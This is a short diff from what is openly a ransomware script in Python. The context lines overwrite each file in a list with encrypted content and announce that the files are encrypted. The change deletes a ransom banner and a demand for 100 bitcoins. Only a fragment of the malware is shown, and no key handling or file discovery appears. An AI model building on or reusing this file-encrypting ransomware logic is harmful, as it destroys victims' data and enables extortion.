@@ -43,8 +43,6 @@ for file in files:
         with open(file,"wb") as thefile:
             thefile.write(content_encrypted)
 
-
-print("RANSOMWARE Alert !!!!")
-print("SURPRISE!!!   SURPRISE!!!   SURPRISE!!!!")
 print("Your File's have been Encrypted...")
-print("Give us 100 Bitcoins to Decrypting it.")
+
+#END
